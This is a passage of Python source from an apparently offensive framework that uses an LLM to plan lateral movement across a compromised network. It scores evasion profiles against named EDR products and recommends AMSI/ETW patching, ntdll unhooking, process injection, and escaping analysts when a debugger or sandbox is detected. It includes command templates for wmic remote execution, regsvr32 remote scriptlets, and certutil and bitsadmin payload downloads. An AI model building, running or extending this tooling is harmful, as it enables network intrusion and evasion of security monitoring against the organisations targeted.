"""
AI-Guided Lateral Movement
Integrates LLM for intelligent "next best jump" suggestions during lateral movement
Analyzes network topology, credentials, and defenses to optimize attack paths
Includes evasion profile scoring for detection risk assessment
Integrates with bypass_amsi_etw for defense analysis
Integrates with sleepmask_cloaking for memory cloaking guidance
Integrates with process_injection_masterclass for AI-dynamic injection
"""

import json
import os
from typing import List, Dict, Optional, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime

from cybermodules.helpers import log_to_intel

# Import evasion profile metrics
try:
    from cybermodules.lateral_evasion import (
        EvasionProfile, ProfileMetrics, PROFILE_METRICS, get_profile_metrics
    )
    HAS_EVASION_METRICS = True
except ImportError:
    HAS_EVASION_METRICS = False
    EvasionProfile = None

# NEW: bypass_amsi_etw modülü entegrasyonu
try:
    from cybermodules.bypass_amsi_etw import (
        DefenseAnalyzer,
        DefenseAnalysis,
        BypassLayer,
        BypassManager,
    )
    HAS_BYPASS_ANALYZER = True
except ImportError:
    HAS_BYPASS_ANALYZER = False

# NEW: Sleepmask cloaking entegrasyonu
try:
    from evasion.sleepmask_cloaking import (
        SleepmaskCloakingEngine,
        AICloakSelector,
        CloakLevel,
        EDRProduct as CloakEDRProduct,
        EDR_CLOAK_PROFILES,
        get_ai_recommendation as get_cloak_recommendation
    )
    HAS_SLEEPMASK_CLOAKING = True
except ImportError:
    HAS_SLEEPMASK_CLOAKING = False
    SleepmaskCloakingEngine = None
    CloakLevel = None

# NEW: Process Injection Masterclass entegrasyonu
try:
    from evasion.process_injection_masterclass import (
        ProcessInjectionMasterclass,
        AIInjectionSelector,
        EDRDetector,
        InjectionTechnique,
        EDRProduct as InjectionEDRProduct,
        InjectionConfig,
        EDR_INJECTION_PROFILES,
        create_masterclass_injector,
        get_ai_recommendation as get_injection_recommendation
    )
    HAS_INJECTION_MASTERCLASS = True
except ImportError:
    HAS_INJECTION_MASTERCLASS = False
    ProcessInjectionMasterclass = None
    InjectionTechnique = None

# NEW: Syscall Obfuscator Monster entegrasyonu
try:
    from evasion.syscall_obfuscator import (
        SyscallObfuscatorMonster,
        AIObfuscationSelector,
        GANStubMutator,
        ObfuscationLayer as SyscallObfuscationLayer,
        EDRProfile as SyscallEDRProfile,
        StubPattern,
        SpoofTarget,
        ObfuscationConfig as SyscallObfuscationConfig,
        EDR_OBFUSCATION_PROFILES,
        create_obfuscator_monster,
        get_ai_recommendation as get_syscall_recommendation
    )
    HAS_SYSCALL_OBFUSCATOR = True
except ImportError:
    HAS_SYSCALL_OBFUSCATOR = False
    SyscallObfuscatorMonster = None
    SyscallObfuscationLayer = None

# NEW: Persistence God Monster entegrasyonu
try:
    from evasion.persistence_god import (
        PersistenceGodMonster,
        AIPersistenceSelector,
        PersistenceChainExecutor,
        PersistenceChain,
        EDRPersistProfile,
        PersistenceConfig,
        EDR_PERSISTENCE_PROFILES,
        create_persistence_god,
        get_ai_persist_recommendation
    )
    HAS_PERSISTENCE_GOD = True
except ImportError:
    HAS_PERSISTENCE_GOD = False
    PersistenceGodMonster = None
    PersistenceChain = None

# Try to import Report Generator
try:
    from tools.report_generator import (
        ReportGenerator,
        ReportConfig,
        ReportFormat,
        ChainLog,
        ChainLogEntry,
        SigmaRuleGenerator,
        MITREMapper,
        AISummaryGenerator,
        create_report_generator,
        quick_report,
        create_sample_chain_log,
        MITRE_TECHNIQUES,
    )
    HAS_REPORT_GENERATOR = True
except ImportError:
    HAS_REPORT_GENERATOR = False
    ReportGenerator = None
    ChainLog = None

# Try to import LLM engine
try:
    from cybermodules.llm_engine import LLMEngine
    HAS_LLM = True
except ImportError:
    HAS_LLM = False

# NEW: VR/AR Visualization entegrasyonu
try:
    from tools.vr_viz import (
        VRViz,
        ExportFormat as VRExportFormat,
        MITREAttackMapper,
        VRScene,
        generate_vr_from_log
    )
    HAS_VR_VIZ = True
except ImportError:
    HAS_VR_VIZ = False
    VRViz = None
    VRExportFormat = None


@dataclass
class HostIntel:
    """Intelligence gathered about a host"""
    hostname: str
    ip: str
    os_type: str = "windows"
    compromised: bool = False
    creds_dumped: bool = False
    beacon_deployed: bool = False
    services: List[str] = None
    open_ports: List[int] = None
    users: List[str] = None
    groups: List[str] = None
    installed_software: List[str] = None
    av_product: str = ""
    domain_joined: bool = True
    is_dc: bool = False
    is_admin_workstation: bool = False
    notes: str = ""
    
    def __post_init__(self):
        if self.services is None:
            self.services = []
        if self.open_ports is None:
            self.open_ports = []
        if self.users is None:
            self.users = []
        if self.groups is None:
            self.groups = []
        if self.installed_software is None:
            self.installed_software = []


@dataclass
class CredentialIntel:
    """Intelligence about a credential"""
    username: str
    domain: str = ""
    cred_type: str = "password"  # password, ntlm_hash, kerberos
    source_host: str = ""
    cracked: bool = False
    tested_hosts: List[str] = None
    successful_hosts: List[str] = None
    is_domain_admin: bool = False
    is_local_admin: bool = False
    
    def __post_init__(self):
        if self.tested_hosts is None:
            self.tested_hosts = []
        if self.successful_hosts is None:
            self.successful_hosts = []


@dataclass
class JumpSuggestion:
    """AI-generated jump suggestion with evasion scoring"""
    target: str
    method: str
    credentials: str
    confidence: float
    reasoning: str
    risk_level: str  # low, medium, high
    expected_value: str  # low, medium, high, critical
    prerequisites: List[str] = None
    # Evasion profile scoring
    recommended_profile: str = "stealth"  # none, default, stealth, paranoid, aggressive
    detection_risk: float = 0.5  # 0.0 - 1.0
    speed_impact: str = "moderate"  # fast, moderate, slow, very_slow
    evasion_notes: List[str] = None
    
    def __post_init__(self):
        if self.prerequisites is None:
            self.prerequisites = []
        if self.evasion_notes is None:
            self.evasion_notes = []


class AILateralGuide:
    """
    AI-powered lateral movement guidance
    Analyzes the network state and suggests optimal next moves
    Integrates bypass_amsi_etw for automated defense analysis
    """
    
    def __init__(self, scan_id: int = 0, api_key: str = None):
        self.scan_id = scan_id
        self.api_key = api_key or os.environ.get('OPENAI_API_KEY', '')
        
        # Intelligence storage
        self.hosts: Dict[str, HostIntel] = {}
        self.credentials: Dict[str, CredentialIntel] = {}
        self.movement_history: List[Dict] = []
        
        # LLM Engine
        self.llm_engine = None
        if HAS_LLM and self.api_key:
            try:
                self.llm_engine = LLMEngine()
            except Exception:
                pass
    
    def add_host_intel(self, host: HostIntel):
        """Add or update host intelligence"""
        self.hosts[host.hostname] = host
        self._log(f"Added host intel: {host.hostname}")
    
    def add_credential_intel(self, cred: CredentialIntel):
        """Add or update credential intelligence"""
        key = f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
        self.credentials[key] = cred
        self._log(f"Added credential intel: {key}")
    
    def record_movement(self, source: str, target: str, method: str, 
                       credential: str, success: bool, output: str = ""):
        """Record a lateral movement attempt"""
        self.movement_history.append({
            'timestamp': datetime.now().isoformat(),
            'source': source,
            'target': target,
            'method': method,
            'credential': credential,
            'success': success,
            'output': output[:500]  # Truncate output
        })
        
        # Update host state if successful
        if success and target in self.hosts:
            self.hosts[target].compromised = True
    
    def get_next_best_jump(self, current_host: str = None) -> List[JumpSuggestion]:
        """
        Get AI-suggested next best lateral movement targets
        Returns list of suggestions ordered by priority
        """
        
        # Build context for AI
        context = self._build_analysis_context(current_host)
        
        # If no LLM available, use rule-based suggestions
        if not self.llm_engine:
            return self._rule_based_suggestions(current_host)
        
        # Use LLM for intelligent suggestions
        try:
            prompt = self._build_suggestion_prompt(context)
            response = self._query_llm(prompt)
            suggestions = self._parse_suggestions(response)
            return suggestions
        except Exception as e:
            self._log(f"LLM suggestion failed: {e}, falling back to rules")
            return self._rule_based_suggestions(current_host)
    
    def analyze_defenses(self, target: str, run_live_scan: bool = False) -> Dict[str, Any]:
        """
        Analyze defenses on a target host and recommend evasion profile
        
        Args:
            target: Target hostname
            run_live_scan: If True and HAS_BYPASS_ANALYZER, run live AMSI/ETW detection
        
        Returns:
            Dict with defense analysis including:
            - av_detected, av_product
            - amsi_present, etw_enabled (if live scan)
            - edr_detected (if live scan)
            - recommended_evasion techniques
            - recommended_profile
            - recommended_bypass_layer
            - detection_risk_by_profile
        """
        if target not in self.hosts:
            return {'error': 'Host not in intel database'}
        
        host = self.hosts[target]
        
        analysis = {
            'host': target,
            'av_detected': bool(host.av_product),
            'av_product': host.av_product,
            'recommended_evasion': [],
            'risk_factors': [],
            'suggested_approach': '',
            # Evasion profile scoring
            'recommended_profile': 'stealth',
            'profile_metrics': None,
            'detection_risk_by_profile': {},
            # NEW: bypass_amsi_etw entegrasyonu
            'amsi_present': False,
            'etw_enabled': False,
            'edr_detected': [],
            'recommended_bypass_layer': 'both',
            'live_scan_performed': False,
            'bypass_recommendations': []
        }
        
        # NEW: Canlı savunma taraması
        if run_live_scan and HAS_BYPASS_ANALYZER:
            try:
                analyzer = DefenseAnalyzer()
                live_analysis = analyzer.analyze_defenses()
                
                analysis['live_scan_performed'] = True
                analysis['amsi_present'] = live_analysis.amsi_present
                analysis['amsi_version'] = live_analysis.amsi_version
                analysis['amsi_hooked'] = live_analysis.amsi_hooked
                analysis['etw_enabled'] = live_analysis.etw_enabled
                analysis['etw_providers'] = live_analysis.etw_providers
                analysis['edr_detected'] = live_analysis.edr_detected
                analysis['recommended_bypass_layer'] = live_analysis.recommended_bypass.value
                analysis['defense_risk_score'] = live_analysis.risk_score
                analysis['defense_notes'] = live_analysis.notes
                
                # Live scan'a göre profil güncelle
                if live_analysis.risk_score >= 70:
                    analysis['recommended_profile'] = 'paranoid'
                elif live_analysis.risk_score >= 50:
                    analysis['recommended_profile'] = 'stealth'
                elif live_analysis.risk_score >= 30:
                    analysis['recommended_profile'] = 'default'
                else:
                    analysis['recommended_profile'] = 'none'
                    
                # Bypass önerileri
                if live_analysis.amsi_present:
                    analysis['bypass_recommendations'].append({
                        'target': 'AMSI',
                        'reason': f'AMSI v{live_analysis.amsi_version} detected',
                        'technique': 'patch_amsi_scan_buffer' if not live_analysis.amsi_hooked else 'unhook_then_patch'
                    })
                if live_analysis.etw_enabled:
                    analysis['bypass_recommendations'].append({
                        'target': 'ETW',
                        'reason': f'{len(live_analysis.etw_providers)} providers active',
                        'technique': 'patch_etw_event_write'
                    })
                if live_analysis.edr_detected:
                    analysis['bypass_recommendations'].append({
                        'target': 'EDR Hooks',
                        'reason': f'EDR detected: {", ".join(live_analysis.edr_detected)}',
                        'technique': 'unhook_ntdll_text_section'
                    })
                    
            except Exception as e:
                analysis['live_scan_error'] = str(e)
        
        # AV-specific recommendations and profile scoring
        av_evasion_map = {
            'defender': {
                'techniques': ['amsi_bypass', 'etw_patching', 'unhook_ntdll'],
                'min_profile': 'default',
                'recommended_profile': 'stealth'
            },
            'crowdstrike': {
                'techniques': ['direct_syscalls', 'sleep_obfuscation', 'process_hollowing', 'srdi'],
                'min_profile': 'stealth',
                'recommended_profile': 'paranoid'
            },
            'sentinelone': {
                'techniques': ['sleep_obfuscation', 'thread_execution_hijacking', 'entropy_jitter'],
                'min_profile': 'stealth',
                'recommended_profile': 'paranoid'
            },
            'carbonblack': {
                'techniques': ['process_hollowing', 'dll_unhooking', 'doppelganging'],
                'min_profile': 'stealth',
                'recommended_profile': 'stealth'
            },
            'elastic': {
                'techniques': ['sleep_obfuscation', 'process_hollowing'],
                'min_profile': 'stealth',
                'recommended_profile': 'paranoid'
            }
        }
        
        if host.av_product:
            av_lower = host.av_product.lower()
            for av_name, av_config in av_evasion_map.items():
                if av_name in av_lower:
                    analysis['recommended_evasion'].extend(av_config['techniques'])
                    analysis['recommended_profile'] = av_config['recommended_profile']
                    break
        
        # Risk factors affect profile recommendation
        risk_score = 0
        if host.is_dc:
            analysis['risk_factors'].append('Domain Controller - high monitoring')
            risk_score += 2
        if 'admin' in target.lower():
            analysis['risk_factors'].append('Admin workstation - likely monitored')
            risk_score += 1
        if host.av_product:
            analysis['risk_factors'].append(f'AV present: {host.av_product}')
            risk_score += 1
        
        # Adjust profile based on risk score
        if risk_score >= 3:
            analysis['recommended_profile'] = 'paranoid'
        elif risk_score >= 2:
            analysis['recommended_profile'] = 'stealth'
        
        # Get detection risk for each profile
        analysis['detection_risk_by_profile'] = self.get_evasion_profile_scoring(target)
        
        # Add profile metrics if available
        if HAS_EVASION_METRICS:
            try:
                profile_enum = EvasionProfile(analysis['recommended_profile'])
                metrics = get_profile_metrics(profile_enum)
                analysis['profile_metrics'] = {
                    'detection_risk': metrics.detection_risk,
                    'speed_multiplier': metrics.speed_multiplier,
                    'stealth_score': metrics.stealth_score,
                    'summary': metrics.get_summary()
                }
            except Exception:
                pass
        
        return analysis
    
    def get_evasion_profile_scoring(self, target: str) -> Dict[str, Dict]:
        """
        Get detection risk scoring for all evasion profiles against a target
        Returns metrics like 'Paranoid modda detection riski %80 azalır ama 5x yavaşlar'
        """
        if target not in self.hosts:
            return {}
        
        host = self.hosts[target]
        scoring = {}
        
        # Base detection risk based on AV/EDR
        base_risk = 0.5  # 50% baseline
        
        if host.av_product:
            av_lower = host.av_product.lower()
            if 'crowdstrike' in av_lower or 'sentinelone' in av_lower:
                base_risk = 0.85  # Advanced EDR = high baseline risk
            elif 'defender' in av_lower:
                base_risk = 0.60  # Defender = moderate risk
            elif 'carbonblack' in av_lower:
                base_risk = 0.75  # CB = moderately high
        
        if host.is_dc:
            base_risk = min(base_risk + 0.15, 0.95)  # DCs have higher monitoring
        
        # Profile-specific scoring
        profiles = [
            ('none', 1.0, 1.0, "Evasion yok - anında tespit"),
            ('default', 0.7, 1.2, "Temel AMSI bypass - hızlı ama riskli"),
            ('stealth', 0.4, 2.0, "Orta düzey gizlilik - dengeli"),
            ('paranoid', 0.2, 5.0, "Maksimum gizlilik - çok yavaş"),
            ('aggressive', 0.55, 1.5, "Hızlı saldırı - orta risk"),
        ]
        
        for profile_name, risk_modifier, speed_mult, description in profiles:
            actual_risk = base_risk * risk_modifier
            detection_reduction = int((1 - risk_modifier) * 100)
            
            scoring[profile_name] = {
                'detection_risk': round(actual_risk, 2),
                'detection_risk_percent': f"{int(actual_risk * 100)}%",
                'detection_reduction': f"{detection_reduction}% azalma",
                'speed_multiplier': speed_mult,
                'speed_impact': f"{speed_mult}x yavaş" if speed_mult > 1 else "baseline",
                'description': description,
                'summary': f"{profile_name.upper()}: {detection_reduction}% risk azalması, {speed_mult}x yavaşlama"
            }
        
        return scoring
    
    def recommend_evasion_for_jump(self, target: str, time_critical: bool = False) -> Tuple[str, Dict]:
        """
        Recommend optimal evasion profile for a specific jump
        
        Args:
            target: Target hostname
            time_critical: If True, prefer faster profiles
        
        Returns:
            Tuple of (profile_name, profile_details)
        """
        scoring = self.get_evasion_profile_scoring(target)
        
        if not scoring:
            return ('stealth', {'reason': 'Default recommendation - no intel'})
        
        if time_critical:
            # Prefer aggressive or default for speed
            if scoring.get('aggressive', {}).get('detection_risk', 1.0) < 0.7:
                return ('aggressive', {
                    **scoring['aggressive'],
                    'reason': 'Time-critical: aggressive profile seçildi, kabul edilebilir risk'
                })
            return ('default', {
                **scoring.get('default', {}),
                'reason': 'Time-critical: default profile, hız öncelikli'
            })
        
        # Normal operation: balance risk and speed
        host = self.hosts.get(target)
        
        # High-value targets get paranoid
        if host and (host.is_dc or host.is_admin_workstation):
            return ('paranoid', {
                **scoring.get('paranoid', {}),
                'reason': f'Yüksek değerli hedef ({target}): paranoid profil önerilir'
            })
        
        # EDR environments get paranoid
        if host and host.av_product:
            av_lower = host.av_product.lower()
            if 'crowdstrike' in av_lower or 'sentinelone' in av_lower:
                return ('paranoid', {
                    **scoring.get('paranoid', {}),
                    'reason': f'Gelişmiş EDR tespit edildi ({host.av_product}): paranoid profil şart'
                })
        
        # Default: stealth
        return ('stealth', {
            **scoring.get('stealth', {}),
            'reason': 'Standart hedef: stealth profil dengeli seçim'
        })

    # ============================================================
    # SLEEP ANOMALY DETECTION & AI GUIDANCE
    # ============================================================
    
    def analyze_sleep_anomaly(self, sleep_result: Dict, current_target: str = None) -> Dict[str, Any]:
        """
        Sleep skip anomaly tespit edildiğinde AI guidance
        Alternatif injection/evasion tekniği öner
        
        Args:
            sleep_result: SleepmaskEngine.masked_sleep() sonucu
            current_target: Mevcut hedef hostname
        
        Returns:
            Dict: AI önerileri
        """
        analysis = {
            "anomaly_type": "sleep_skip",
            "severity": "medium",
            "recommended_actions": [],
            "alternative_techniques": [],
            "evasion_adjustments": [],
            "ai_assessment": "",
        }
        
        if not sleep_result.get("skip_detected"):
            analysis["anomaly_type"] = "none"
            analysis["severity"] = "low"
            analysis["ai_assessment"] = "No anomaly detected - continue normal operation"
            return analysis
        
        skip_reason = sleep_result.get("skip_reason", "Unknown")
        technique_used = sleep_result.get("technique_used", "unknown")
        
        # Severity assessment
        if "shortened" in skip_reason.lower():
            # Sleep was shortened - likely sandbox/EDR acceleration
            analysis["severity"] = "high"
            analysis["anomaly_type"] = "sleep_acceleration"
            analysis["recommended_actions"] = [
                "Switch to alternative sleep technique",
                "Increase jitter percent",
                "Consider process migration",
                "Implement fake sleep decoy",
            ]
            analysis["alternative_techniques"] = [
                {"technique": "death_sleep", "reason": "Thread suspension harder to skip"},
                {"technique": "zilean", "reason": "Timer-based with masking"},
                {"technique": "foliage", "reason": "APC-based approach"},
            ]
            
        elif "extended" in skip_reason.lower():
            # Sleep was extended - likely debugger pause
            analysis["severity"] = "critical"
            analysis["anomaly_type"] = "debugger_pause"
            analysis["recommended_actions"] = [
                "Immediate process migration",
                "Consider termination and re-injection",
                "Enable anti-debug countermeasures",
                "Reduce beacon activity",
            ]
            analysis["alternative_techniques"] = [
                {"technique": "process_hollowing", "reason": "New process, fresh state"},
                {"technique": "thread_hijacking", "reason": "Different execution context"},
            ]
            
        elif "discrepancy" in skip_reason.lower():
            # Timer discrepancy - sophisticated sandbox
            analysis["severity"] = "high"
            analysis["anomaly_type"] = "timer_manipulation"
            analysis["recommended_actions"] = [
                "Multi-timer validation",
                "RDTSC-based timing checks",
                "Consider environment exit",
            ]
        
        # Evasion profile adjustments
        if analysis["severity"] in ["high", "critical"]:
            analysis["evasion_adjustments"] = [
                {"setting": "profile", "from": "any", "to": "paranoid", "reason": "Maximum evasion needed"},
                {"setting": "sleepmask_check_sleep_skip", "value": True, "reason": "Continue monitoring"},
                {"setting": "detect_debugger", "value": True, "reason": "Enable debugger detection"},
                {"setting": "use_drip_loader", "value": True, "reason": "Slow memory loading"},
            ]
        
        # LLM-based assessment if available
        if self.llm_engine:
            try:
                prompt = f"""
Sleep anomaly detected during lateral movement:
- Technique used: {technique_used}
- Skip reason: {skip_reason}
- Current target: {current_target or 'Unknown'}

Assess the situation and provide:
1. Likely cause (sandbox, EDR, debugger)
2. Immediate recommended action
3. Long-term evasion adjustment

Be concise and tactical.
"""
                ai_response = self._query_llm(prompt)
                analysis["ai_assessment"] = ai_response
            except Exception as e:
                analysis["ai_assessment"] = f"AI assessment unavailable: {e}"
        else:
            # Rule-based assessment
            assessments = {
                "sleep_acceleration": "EDR/Sandbox detected - likely accelerating sleeps to speed analysis. Recommend switching to death_sleep technique and implementing timing validation.",
                "debugger_pause": "CRITICAL: Debugger detected - analyst may be examining beacon. Immediate process migration recommended.",
                "timer_manipulation": "Sophisticated sandbox with timer manipulation detected. Consider environment validation before continuing.",
            }
            analysis["ai_assessment"] = assessments.get(
                analysis["anomaly_type"],
                "Unknown anomaly - recommend increasing evasion profile"
            )
        
        return analysis
    
    def recommend_injection_after_sleep_skip(self, current_technique: str) -> Dict[str, Any]:
        """
        Sleep skip sonrası alternatif injection tekniği öner
        
        Args:
            current_technique: Mevcut injection tekniği
        
        Returns:
            Dict: Önerilen alternatif teknik
        """
        alternatives = {
            "thread_hijacking": {
                "alternative": "early_bird",
                "reason": "Inject before main thread executes",
                "risk": "medium",
            },
            "early_bird": {
                "alternative": "process_hollowing",
                "reason": "Replace process image entirely",
                "risk": "low",
            },
            "process_hollowing": {
                "alternative": "doppelganging",
                "reason": "NTFS transaction based - harder to detect",
                "risk": "low",
            },
            "doppelganging": {
                "alternative": "ghosting",
                "reason": "Delete-pending file technique",
                "risk": "low",
            },
            "apc_injection": {
                "alternative": "thread_hijacking",
                "reason": "Hijack existing thread context",
                "risk": "medium",
            },
        }
        
        default = {
            "alternative": "process_hollowing",
            "reason": "Fallback to reliable technique",
            "risk": "low",
        }
        
        recommendation = alternatives.get(current_technique, default)
        
        # Add timing advice
        recommendation["timing_advice"] = [
            "Wait for random interval (30-120s) before re-injection",
            "Validate environment before proceeding",
            "Use drip-loader for slow memory allocation",
        ]
        
        return recommendation
    
    def get_sleep_evasion_profile(self, anomaly_history: List[Dict]) -> Dict[str, Any]:
        """
        Anomaly geçmişine göre optimal sleep profili öner
        
        Args:
            anomaly_history: Önceki anomaly kayıtları
        
        Returns:
            Dict: Önerilen sleep konfigürasyonu
        """
        skip_count = sum(1 for a in anomaly_history if a.get("skip_detected"))
        total = len(anomaly_history)
        skip_ratio = skip_count / max(1, total)
        
        profile = {
            "technique": "ekko",
            "masking_mode": "xor",
            "jitter_percent": 0.3,
            "min_sleep_ms": 5000,
            "max_sleep_ms": 30000,
            "check_sleep_skip": True,
            "use_drip_loader": False,
            "notes": [],
        }
        
        if skip_ratio >= 0.5:
            # High anomaly rate - aggressive evasion
            profile["technique"] = "death_sleep"
            profile["masking_mode"] = "rc4"
            profile["jitter_percent"] = 0.5
            profile["min_sleep_ms"] = 10000
            profile["use_drip_loader"] = True
            profile["notes"].append("High anomaly rate detected - maximum evasion enabled")
            
        elif skip_ratio >= 0.2:
            # Moderate anomaly rate
            profile["technique"] = "foliage"
            profile["jitter_percent"] = 0.4
            profile["notes"].append("Moderate anomaly rate - increased jitter")
            
        else:
            # Low anomaly rate
            profile["notes"].append("Low anomaly rate - standard profile")
        
        return profile
    
    def recommend_lotl_fallback(self, blocked_technique: str, target: str = "") -> Dict[str, Any]:
        """
        Injection tekniği engellendiğinde LOTL fallback öner
        
        AI: Savunmaya göre otomatik LOTL'ye düş
        
        Args:
            blocked_technique: Engellenen injection tekniği
            target: Hedef host (opsiyonel)
        
        Returns:
            Dict: LOTL önerisi ve konfigürasyonu
        """
        # LOTL bins by stealth and reliability
        lotl_options = {
            "wmi": {
                "stealth": 7,
                "reliability": 9,
                "mitre": "T1047",
                "description": "WMI Process Create - Native Windows",
                "command_template": 'wmic /node:{target} process call create "{payload}"',
            },
            "mshta": {
                "stealth": 6,
                "reliability": 8,
                "mitre": "T1218.005",
                "description": "HTA execution - Script execution",
                "command_template": 'mshta.exe javascript:...',
            },
            "rundll32": {
                "stealth": 5,
                "reliability": 8,
                "mitre": "T1218.011",
                "description": "rundll32 execution - DLL/JavaScript",
                "command_template": 'rundll32.exe shell32.dll,ShellExec_RunDLL ...',
            },
            "cmstp": {
                "stealth": 7,
                "reliability": 7,
                "mitre": "T1218.003",
                "description": "CMSTP INF install - UAC bypass potential",
                "command_template": 'cmstp.exe /s {inf_file}',
            },
            "regsvr32": {
                "stealth": 6,
                "reliability": 7,
                "mitre": "T1218.010",
                "description": "regsvr32 SCT execution",
                "command_template": 'regsvr32 /s /n /u /i:{sct_url} scrobj.dll',
            },
            "certutil": {
                "stealth": 5,
                "reliability": 9,
                "mitre": "T1140",
                "description": "certutil download/decode",
                "command_template": 'certutil -urlcache -split -f {url} {output}',
            },
            "bitsadmin": {
                "stealth": 5,
                "reliability": 8,
                "mitre": "T1197",
                "description": "BITS download",
                "command_template": 'bitsadmin /transfer job /download /priority high {url} {output}',
            },
            "forfiles": {
                "stealth": 8,
                "reliability": 6,
                "mitre": "T1202",
                "description": "forfiles indirect command execution",
                "command_template": 'forfiles /p c:\\windows\\system32 /m notepad.exe /c "{command}"',
            },
            "pcalua": {
                "stealth": 8,
                "reliability": 6,
                "mitre": "T1202",
                "description": "pcalua.exe program compatibility assistant",
                "command_template": 'pcalua.exe -a {payload}',
            },
        }
        
        # Technique to LOTL mapping (what to use when blocked)
        fallback_map = {
            "classic_crt": ["wmi", "forfiles", "pcalua"],
            "early_bird_apc": ["wmi", "mshta", "cmstp"],
            "thread_hijack": ["wmi", "rundll32", "regsvr32"],
            "process_hollowing": ["wmi", "mshta", "certutil"],
            "module_stomping": ["wmi", "cmstp", "forfiles"],
            "ghosting": ["wmi", "mshta", "rundll32"],
            "doppelganging": ["wmi", "cmstp", "pcalua"],
            "syscall": ["wmi", "forfiles", "mshta"],
        }
        
        recommended_bins = fallback_map.get(blocked_technique, ["wmi", "mshta", "rundll32"])
        
        # Build recommendation
        primary = recommended_bins[0]
        alternatives = recommended_bins[1:]
        
        recommendation = {
            "reason": f"Injection technique '{blocked_technique}' blocked - falling back to LOTL",
            "primary": {
                "name": primary,
                **lotl_options.get(primary, {})
            },
            "alternatives": [
                {"name": alt, **lotl_options.get(alt, {})}
                for alt in alternatives
            ],
            "target": target,
            "execution_order": recommended_bins,
            "guidance": [
                f"Primary: Use {primary} for execution",
                f"If {primary} fails, try: {', '.join(alternatives)}",
                "WMI is generally most reliable for lateral movement",
                "Consider encoding commands with base64 for evasion",
            ],
            "ai_notes": [
                "LOTL binaries are signed Microsoft tools - less suspicious",
                "WMI doesn't require file drops on target",
                "CMSTP can bypass UAC in some scenarios",
            ],
        }
        
        return recommendation
    
    def auto_select_execution_method(self, target: str, edr_detected: str = None,
                                     blocked_techniques: List[str] = None) -> Dict[str, Any]:
        """
        AI: Otomatik execution metodu seç
        
        1. Önce process injection dene (stealth order)
        2. Engellendiyse LOTL'ye düş
        3. LOTL de engellendiyse alternatif LOTL
        
        Args:
            target: Hedef host
            edr_detected: Tespit edilen EDR (opsiyonel)
            blocked_techniques: Engellenen teknikler listesi
        
        Returns:
            Dict: Seçilen metod ve konfigürasyon
        """
        blocked_techniques = blocked_techniques or []
        
        # Injection techniques by stealth (highest first)
        injection_order = [
            ("ghosting", 10),
            ("doppelganging", 9),
            ("transacted_hollowing", 9),
            ("syscall", 9),
            ("module_stomping", 8),
            ("early_bird_apc", 8),
            ("phantom_dll", 8),
            ("thread_hijack", 7),
            ("process_hollowing", 6),
            ("classic_crt", 2),
        ]
        
        # EDR specific adjustments
        edr_adjustments = {
            "CrowdStrike": {
                "avoid": ["classic_crt", "process_hollowing"],
                "prefer": ["ghosting", "syscall"],
            },
            "SentinelOne": {
                "avoid": ["classic_crt", "thread_hijack"],
                "prefer": ["doppelganging", "module_stomping"],
            },
            "Defender": {
                "avoid": ["classic_crt"],
                "prefer": ["early_bird_apc", "syscall"],
            },
        }
        
        # Filter available techniques
        available_injection = [
            (tech, stealth) for tech, stealth in injection_order
            if tech not in blocked_techniques
        ]
        
        # Apply EDR adjustments
        if edr_detected and edr_detected in edr_adjustments:
            adjustments = edr_adjustments[edr_detected]
            available_injection = [
                (tech, stealth) for tech, stealth in available_injection
                if tech not in adjustments.get("avoid", [])
            ]
            # Boost preferred techniques
            for tech, _ in available_injection:
                if tech in adjustments.get("prefer", []):
                    available_injection = [(tech, 10)] + [
                        (t, s) for t, s in available_injection if t != tech
                    ]
        
        # Choose best injection
        if available_injection:
            best_injection = available_injection[0][0]
            return {
                "method_type": "injection",
                "technique": best_injection,
                "stealth": available_injection[0][1],
                "target": target,
                "fallback_to_lotl": False,
                "config": {
                    "use_syscalls": best_injection in ["syscall", "ghosting", "doppelganging"],
                    "use_indirect_syscalls": True,
                },
            }
        
        # All injection blocked - fallback to LOTL
        lotl_order = ["wmi", "mshta", "cmstp", "rundll32", "regsvr32", "forfiles"]
        available_lotl = [
            bin for bin in lotl_order
            if bin not in blocked_techniques
        ]
        
        if available_lotl:
            return {
                "method_type": "lotl",
                "technique": available_lotl[0],
                "alternatives": available_lotl[1:3],
                "target": target,
                "fallback_to_lotl": True,
                "reason": "All injection techniques blocked",
                "config": {
                    "encode_commands": True,
                    "cleanup_artifacts": True,
                },
            }
        
        # Everything blocked - return error
        return {
            "method_type": "none",
            "error": "All execution methods blocked",
            "target": target,
            "blocked_count": len(blocked_techniques),
        }

    def suggest_attack_path(self, start: str, goal: str, 
                           include_syscall_risk: bool = True) -> List[Dict]:
        """
        Suggest optimal attack path from start to goal
        Uses graph analysis and AI for path optimization
        
        Args:
            start: Starting host
            goal: Goal host
            include_syscall_risk: Include syscall detection risk analysis
        
        Returns:
            List of path steps with detection risk assessment
        """
        
        if not self.llm_engine:
            path = self._simple_path(start, goal)
            if include_syscall_risk:
                path = self._add_syscall_risk_to_path(path)
            return path
        
        context = {
            'start': start,
            'goal': goal,
            'hosts': {h: self._host_to_dict(intel) for h, intel in self.hosts.items()},
            'credentials': {c: self._cred_to_dict(intel) for c, intel in self.credentials.items()},
            'history': self.movement_history[-10:]  # Last 10 movements
        }
        
        # Enhanced prompt with syscall risk consideration
        syscall_risk_section = ""
        if include_syscall_risk:
            syscall_risk_section = """
6. Syscall Detection Risk:
   - Consider EDR syscall monitoring (Sysmon Event ID 10, EDR hooks)
   - Prefer techniques with low syscall detection risk
   - Indirect syscalls reduce risk vs direct Win32 API calls
   - LOTL techniques have lower syscall footprint
   
   Rate each step's syscall detection risk:
   - LOW: LOTL techniques (WMI, PowerShell remoting)
   - MEDIUM: Standard lateral movement (SMB, RPC)
   - HIGH: Process injection requiring NtAllocateVirtualMemory, NtWriteVirtualMemory
   - CRITICAL: Direct syscalls without obfuscation
"""
        
        prompt = f"""
Analyze this network state and suggest the optimal lateral movement path:

START: {start}
GOAL: {goal}

KNOWN HOSTS:
{json.dumps(context['hosts'], indent=2)}

AVAILABLE CREDENTIALS:
{json.dumps({k: {{**v, 'password': '[REDACTED]'}} for k, v in context['credentials'].items()}, indent=2)}

MOVEMENT HISTORY:
{json.dumps(context['history'], indent=2)}

Suggest the optimal path considering:
1. Stealth (avoid detection)
2. Credential reuse across hosts
3. High-value intermediate targets
4. Defense evasion requirements
5. EDR/AV presence on targets
{syscall_risk_section}

Return as JSON array of steps with:
- target: target hostname
- method: lateral movement technique
- credential: credential to use
- reasoning: why this step
